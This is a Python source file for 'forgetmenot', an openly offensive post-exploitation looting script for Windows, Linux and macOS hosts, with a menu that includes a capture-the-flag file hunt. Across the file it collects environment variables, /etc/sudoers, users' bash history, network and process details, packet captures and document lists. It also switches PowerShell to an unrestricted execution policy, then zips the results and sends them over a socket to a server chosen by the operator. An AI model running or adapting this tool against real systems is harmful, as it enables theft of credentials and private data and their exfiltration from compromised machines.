import re, sys, os, platform, socket, zipfile, time
from subprocess import Popen, PIPE

#
#       forgetmenot.py
#               a local looting script in Python for Win/Lin/OSX hosts
#
#       Eric Valenzuela, eevn.io
#       May 02, 2018
#

### Main Menu --start--
def mainmenu():
    outfiles = [None]
    try:
        mitem = None
        while mitem != 5:
            print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Compression/ Encryption Options\n   4: Flag hunt\n   5: Exit')
            try:
                mitem = input('fmn_$>')
            except SyntaxError:
                mitem = None
            if mitem == 5:      # exit
                print('Exiting')
                return
            elif mitem == 1:    # lootme
                outfiles = lootme_stub(outfiles)
            elif mitem == 2:    # exfil options
                outfiles = exfil_options(outfiles)
            elif mitem == 3:    # compression/ encryption options
                print(3)
            elif mitem == 4:    # flag hunt
                outfiles = flaghunt(outfiles)
            else:
                print("Invalid Selection.")
                mitem = None
    except SystemError:
        print('Runtime error:')
        for i in sys.exc_info():
            print(i)
    return
### Main Menu --end--

### lootme_stub --start--
def lootme_stub(outfiles):
    if platform.system() == 'Windows':
        print('Running on Windows...')
        outfiles = lootme_windows(outfiles)
    elif platform.system() == 'Linux':
        print('Running on Linux...')
        outfiles = lootme_linux(outfiles)
    elif platform.system() == 'Darwin':
        print('Running on OSX...')
        outfiles = lootme_osx(outfiles)
    else:
        print('OS not recognized. Exiting.')
    return outfiles
### lootme_stub --end--

### lootme_windows --start--
def lootme_windows(outfiles):
    try:
        import winreg
        # to be filled later
    except:
        print('winreg module not present')
    
    hostloot = ((platform.uname()[1])+"_loot.txt")
    outfiles.append(hostloot)
    with open(hostloot, 'w') as outFile:
        # gather machine info
        machine_info(outFile)
        # gather extended machine info 
        machine_info_extra_win(outFile)
        # gather user info
        user_info_win(outFile)
        # gather network info
        network_info_win(outFile)
        # gather log file IPs
        logfile_ips(outFile)

    return outfiles
### lootme_windows --end--

### lootme_linux --start--
def lootme_linux(outfiles):
    
    hostloot = (platform.uname()[1]+'_loot.txt')
    outfiles.append(hostloot)
    with open(hostloot, 'w') as outFile:
        # gather machine info
        machine_info(outFile)
        # gather user info
        user_info_lin(outFile)
        # gather network info
        network_info_lin(outFile)
        # gather disk info
        disk_info_lin(outFile)
        # gather process info
        process_info_lin(outFile)
        # search user files for extractable data
        userdata_extract_lin(outFile)
        # search for list of user files
        outfiles = userfiles_list_lin(outfiles)
        # search entire os for .log files, and grab all unique IP addresses
        logfile_ips(outFile)
        
    return outfiles
### lootme_linux --end--

### lootme_osx --start--
def lootme_osx(outfiles):

    hostloot = (platform.uname()[1]+'_loot.txt')
    outfiles.append(hostloot)
    with open(hostloot, 'w') as outFile:
        # gather machine info
        machine_info(outFile)
        # gather user info
        user_info_osx(outFile)
        # gather network info
        network_info_osx(outFile)
        # gather disk info
        disk_info_osx(outFile)
        #gather process info
        process_info_osx(outFile)
    return outfiles
### lootme_osx --end--

### Machine info --start--
def machine_info(outFile):
    # Dump machine information
    outFile.write('Machine info:\n')
    outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
    # Dump environment variables
    outFile.write("Environment vars:\n"+str(os.environ)+'\n')
### Machine info --end--

### Machine info extra Windows --start--
def machine_info_extra_win(outFile):
    # wmic commands
    pArgs = ["wmic", "os"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "product"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "logicaldisk"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "netlogin"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "startup"]
    execoutput_grab(outFile, pArgs)
    
    # powershell commands
    pArgs = ["powershell", "set-executionpolicy", "unrestricted"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["powershell", "get-ciminstance", "win32_operatingsystem", "|", "FL", "*"]
    execoutput_grab(outFile, pArgs)
### Machine info extra Windows --end--

### User info Windows --start--
def user_info_win(outFile):
    pArgs = ["net", "user"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "UserAccount", "get", "Name"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "rdaccount"]
    execoutput_grab(outFile, pArgs)
### User info Windows --end--

### User info Linux --start--
def user_info_lin(outFile):
    pArgs = ["getent", "passwd"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["w"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["last"]
    execoutput_grab(outFile, pArgs)

    path = '/etc/sudoers'
    if os.path.isfile(path):
        filecontents_grab(outFile, path)
### User info Linux --end--

### User info OSX --start--
def user_info_osx(outFile):
    pArgs = ["dscl", ".", "list", "/Users"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["dscl", ".", "read", "/Groups/admin", "GroupMembership"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["w"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["last"]
    execoutput_grab(outFile, pArgs)
### User info OSX --end--

### Network info Linux --start--
def network_info_lin(outFile):
    if os.path.isfile('/etc/sysconfig/network'):
        filecontents_grab(outFile,  '/etc/sysconfig/network')
       
    if os.path.isfile('/etc/resolv.conf'):
        filecontents_grab(outFile, '/etc/resolv.conf')
        
    if os.path.isdir('/etc/sysconfig/network-scripts'):
        try:
            path = '/etc/sysconfig/network-scripts/'
            interfaces = os.listdir(path)
            for file in interfaces:
                if re.search('^ifcfg-[.]*',  file):
                    if os.path.isfile((path+file)):
                        filecontents_grab(outFile,  os.path.join(path, file))
        except:
            print('/etc/sysconfig/network-scripts/ is not present or accessible')
        
    pArgs = ["ifconfig"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["arp", "-v"]
    execoutput_grab(outFile, pArgs)

    try:
        pArgs = ["timeout", "60", "tcpdump"]
        execoutput_grab(outFile, pArgs)
    except:
        try:
            pArgs = ["tcpdump", "&"]
            execoutput_grab(outFile, pArgs, False)
            
            pArgs = ["sleep", "60s", "&&", "pkill", "-HUP", "-f", "tcpdump"]
            execoutput_grab(outFile, pArgs)
        except:
            print('\ntcpdump capture failed.\n')
### Network info Linux --end--

### Network info Windows --start--
def network_info_win(outFile):
    pArgs = ["netstat"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "nicconfig"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "netuse"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["wmic", "share"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["powershell", "set-executionpolicy", "unrestricted"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["powershell", "get-netipconfiguration"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["arp", "/a"]
    execoutput_grab(outFile, pArgs)
### Network info Windows --end--

### Network info OSX --start--
def network_info_osx(outFile):
    pArgs = ["ifconfig"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["arp", "-a"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["tcpdump", "&"]
    execoutput_grab(outFile, pArgs, False)

    pArgs = ["sleep", "60s", "&&", "pkill", "-HUP", "-f", "tcpdump"]
    execoutput_grab(outFile, pArgs)

### Network info OSX --end--

### Disk info Linux --start--
def disk_info_lin(outFile):
    pArgs = ["df"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["lsblk"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["blkid"]
    execoutput_grab(outFile, pArgs)
    
    path = '/etc/fstab'
    if os.path.isfile(path):
        filecontents_grab(outFile, path)
### Disk info Linux --end--

### Disk info OSX --start--
def disk_info_osx(outFile):
    pArgs = ["df"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["diskutil", "list"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["diskutil", "info", "-all"]

### Disk info OSX --end--

### Process info Linux --start --
def process_info_lin(outFile):
    pArgs = ["ps", "aux", "-ef", "|", "grep", "root"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["top"]
    execoutput_grab(outFile, pArgs)
    
    path = '/etc/service'
    if os.path.isfile(path):
        filecontents_grab(outFile, path)
    
    pArgs = ["dpkg", "-l"]
    execoutput_grab(outFile, pArgs)
    
    pArgs = ["rpm", "-qa"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["sudo", "-l"]
    execoutput_grab(outFile, pArgs)
### Process info Linux --end--

### Process info OSX --start--
def process_info_osx(outFile):
    pArgs = ["top", "-l", "1"]
    execoutput_grab(outFile, pArgs)

    pArgs = ["ps", "-ef"]
    execoutput_grab(outFile, pArgs)

### Process info OSX --end--

### User data extraction Linux --start--
def userdata_extract_lin(outFile):
    userdirs = os.listdir('/home/')
    for d in userdirs:
            outFile.write('\nUser: '+d+'\n')
            path = '/home/'+str(d)+'/'
            # search bashrc files for alias designations
            if os.path.isfile((path+'.bashrc')):
                filecontents_grab(outFile,  os.path.join(path,  '.bashrc'))
            # grab bash history
            if os.path.isfile((path+'.bash_history')):
                filecontents_grab(outFile,  os.path.join(path,  '.bash_history'))
### User data extraction Linux --end--

### User files list Linux --start--
def userfiles_list_lin(outfiles):
    userdirs = os.listdir('/home/')
    userfiles = (platform.uname()[1]+'_userFiles.txt')
    outfiles.append(userfiles)
    with open(userfiles, 'w') as ufs:
        ufs.write('\nFiles discovered:')
        for d in userdirs:
            for path, subdirs, files in os.walk('/home/'+d):
                for name in files:
                    # search user directories for specified filetypes:
                    #   pdf, txt, doc(x)
                    if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
                        ufs.write('\n'+os.path.join(path, name)+'\n')
    return outfiles
### User files list --end--

###  Log file IPs --start--
def logfile_ips(outFile):
    unique_ips = [None]
    for path, subdirs, files in os.walk('/'):
            for name in files:
                if re.search('[.]*\.log$', name):
                    #print('log file: ' + name)
                    try:
                        with open(os.path.join(path, name), 'r') as logFile:
                            for line in logFile:
                                #ips = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)
                                # this regex is the best way I've come up with to only grab valid IPs. If you do not reverse the order from how the IP is read (i.e. by checking right-to-left), then 80.80.80.80 will return 80.80.80.8, since the first, single-digit of the final octet will match before the 2-digit possibility is checked.
                                ips  = re.findall('((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]))', line)
                                if ips is not None:
                                    for ip in ips:
                                        #if ip not in unique_ips and isinstance(ip, basestring) and re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ip):
                                        if ip[0] not in unique_ips:
                                            #print(str(ip[0]))
                                            if unique_ips == [None]:
                                                unique_ips = [ip[0]]
                                            else:
                                                unique_ips.append(ip[0])
                    except IOError:
                        print('IO Error. Likely do not have read permissions for '+name)
    if unique_ips is not [None]:
            outFile.write('\nUnique IPs from logs:\n')
            unique_ips.sort()
            for ip in unique_ips:
                outFile.write(str(ip)+'\n')
    return
### Log file IPs --end--

### exfil options --start--
def exfil_options(outfiles):
    for i in outfiles:
        if i is not None:
            print('file: '+i)
    try:
        mitem = None
        while mitem != 2:
            print('\nExfil options:\n   1: send loot files to server\n   2: Back to main menu')
            try:
                mitem = input('fmn_$>')
            except SyntaxError:
                print('Syntax error.')
                mitem = None
            if mitem == 2:      # exit
                print('Exiting')
                return
            elif mitem == 1:
                send2srvr(outfiles)
            else:
                mitem = None
                print('Invalid selection.')
    except:
        print('Error. Returning to main menu.')
        return
    return
### exfil options --end--

### send to server --start--
def send2srvr(outfiles):
    print('\nEnter port to connect to.')
    port = input()
    sock = socket.socket()
    print('\nEnter server IP')
    if sys.version_info < (3,  0):
        host = str(raw_input())
    elif sys.version_info > (3, 0):
        host = str(input())
    else:
        print('Invalid Python version detected!')

    files = os.listdir('./')
    for f in files:
        regex_query = '^'+platform.uname()[1]+'_[.]*'
        if re.search(regex_query, f) and f not in outfiles and not re.search('[.]*\.zip$',  f):
            outfiles.append(f)
            print('Adding '+f+' to outfiles.')

    lootzip = (platform.uname()[1]+'_loot.zip')
    try:
        with zipfile.ZipFile(lootzip, 'w') as lzip:
            for i in outfiles:
                if i is not None:
                    lzip.write(i)
            lzip.close()
    except:
        print('Zip write error')
        for e in sys.exc_info():
            print(e)

    if re.match('\d{1,5}', str(port)):
        try:
            sock.connect((host, port))
            sock.send(lootzip)
            sock.close()
            
            sock = socket.socket()
            sock.connect((host, port))
            with open(lootzip, 'r') as sendfile:
                l = sendfile.read(1024)
                while(l):
                    print('Sending...')
                    sock.send(l)
                    l = sendfile.read(1024)
                sendfile.close()
                print('Done sending.')
                sock.close()
        except:
            print('Something bad happened.\n')
            for i in sys.exc_info():
                print(i)
    return outfiles
### send to server --end--

### flag hunt --start--
def flaghunt(outfiles):
    hostflags = (platform.uname()[1]+'_flagFiles.txt')
    outfiles.append(hostflags)
    with open(hostflags, 'w') as outFile:
        outFile.write('Potential flags found:\n')
        for path, subdirs, files in os.walk('/'):
            for name in files:
                # List of ignored locations and filetypes:
                #   /var/lib
                #   /sys
                #   /proc
                #   /usr/src
                #   /usr/share/help
                #   /usr/share/man
                #   /usr/lib
                #   *.h
                #   *.page
                if (re.search('[.]*flag[.]*', name) 
                    and not re.search('^/var/lib/', path) 
                    and not re.search('^/sys/', path) 
                    and not re.search('^/proc/', path) 
                    and not re.search('^/usr/src/', path) 
                    and not re.search('^/usr/share/help/', path) 
                    and not re.search('^/usr/share/man/', path) 
                    and not re.search('^/usr/lib/', path) 
                    and not re.search('[.]*\.h', name) 
                    and not re.search('[.]*\.page', name)):
                    #print(os.path.join(path, name))
                    outFile.write(os.path.join(path, name)+'\n')
    return outfiles
### flag hunt --end--

### grab file contents --start--
def filecontents_grab(outFile,  contentfile):
    try:
        with open(contentfile, 'r') as cf:
            outFile.write('\n.'+str(contentfile)+' file:\n')
            content = cf.readlines()
            for line in content:
                outFile.write(line)
    except:
        print('Error reading from '+contentfile+' file.')
### grab file contents --end--

### grab execution output --start--
def execoutput_grab(outFile, pArgs, wait=None):     # Set the 'wait' arg to False if you want to open more subprocesses concurrently.
    try:
        outFile.write('\n'+pArgs[0]+' output:\n')
        p = Popen(pArgs, stdout=PIPE)
        (output,  err) = p.communicate()
        if wait is not False:
            exit_code = p.wait()
        else:
            print("Not waiting for "+pArgs[0]+" to complete.")
        for line in output:
            outFile.write(line)
    except:
        print('Error executing '+pArgs[0])
### grab execution output --end--

### Program init --start--
mainmenu()
